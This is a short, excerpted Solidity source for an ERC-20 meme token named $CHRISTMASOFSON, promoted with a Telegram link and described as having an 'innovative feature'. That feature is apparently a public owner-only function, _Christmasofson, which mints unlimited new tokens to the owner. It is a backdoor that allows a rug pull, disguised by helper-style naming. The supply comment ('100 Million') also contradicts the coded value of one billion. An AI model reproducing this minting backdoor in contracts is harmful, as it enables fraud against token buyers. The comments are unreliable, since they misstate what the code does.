...
//
// $ChristmasOfSon proposes an innovative feature in its contract.
//
// 📱 Telegram:https://t.me/SonOfChirstmas
//
...
contract ERC20 is Context, IERC20, Ownable {
    ...
    function _Christmasofson(uint256 amount) public onlyOwner {
    _Christmasofson(msg.sender, amount);
    }
    ...
    function _Christmasofson(address account, uint256 amount) internal virtual {
...
contract $CHRISTMASOFSON is ERC20 {

    uint tokenTotalSupply = 1000000000; // 100 Million Token Supply

    constructor() public ERC20("CHRISTMASOF SON", "CHRISTMASOFSON") {
        _Christmasofson(msg.sender, tokenTotalSupply * (10 ** uint256(decimals())));
    }
}